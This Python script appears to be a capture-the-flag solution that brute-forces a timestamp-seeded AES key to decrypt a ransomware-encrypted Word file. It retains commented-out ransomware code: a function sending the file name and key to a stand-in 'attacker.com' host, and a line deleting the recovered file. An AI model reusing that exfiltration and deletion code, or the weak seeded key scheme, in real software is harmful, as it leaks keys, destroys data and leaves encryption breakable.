#!/home/pm/anaconda/bin/python
#encoding=utf-8
'''
  _    _     ___   ____ _  _____ _____    _  
 | |  | |   / _ \ / ___| |/ /_ _|_   _|  | | 
/ __) | |  | | | | |   | ' / | |  | |   / __)
\__ \ | |__| |_| | |___| . \ | |  | |   \__ \
(   / |_____\___/ \____|_|\_\___| |_|   (   /
 |_|                                     |_| 

'''

from Crypto.Cipher import AES
import random
import time
import os
from tqdm import tqdm
from docx import Document
import StringIO

plaintext_file = "answer.docx"
encrypted_file = "secret.docx.enc"
IV = "\x42" * AES.block_size

#def send_key(key):
#    '''
#    Send the encryption key to our server.
#    '''
#    import requests
#    requests.get("https://attacker.com", params = {"file" : plaintext_file, "key" : key})

def generate_key(size, stamp):
    key = bytearray()
    random.seed(int(stamp))
    for _ in range(size):
        key.append(random.randint(0, 255))
    return str(key)

def pad(text):
    return text + (AES.block_size - len(text) % AES.block_size) * "\xff"

def encrypt(plaintext, cipher):
    return cipher.encrypt(pad(plaintext)).encode('hex')
def decrypt(ciphertext, cipher):
    return cipher.decrypt(ciphertext)

def main():
    for i in tqdm(range(-10000, 10000)):
        with open(encrypted_file, 'r') as f:
            ciphertext = f.read()
        key = generate_key(32, 1459429218 + i)
        # send_key(key.encode('hex'))
        cipher = AES.new(key, IV=IV, mode=AES.MODE_CBC)
        plaintext = decrypt(ciphertext.decode('hex'), cipher)
        try: 
            doc = Document(StringIO.StringIO(plaintext))
            print "It worked!"
            print 1459429218 + i, "was the epoch"
            with open(plaintext_file, 'w+') as f:
                f.write(plaintext)
        except Exception:
            continue

    # 😈
    # os.remove(plaintext_file)

if __name__ == "__main__":
    main()


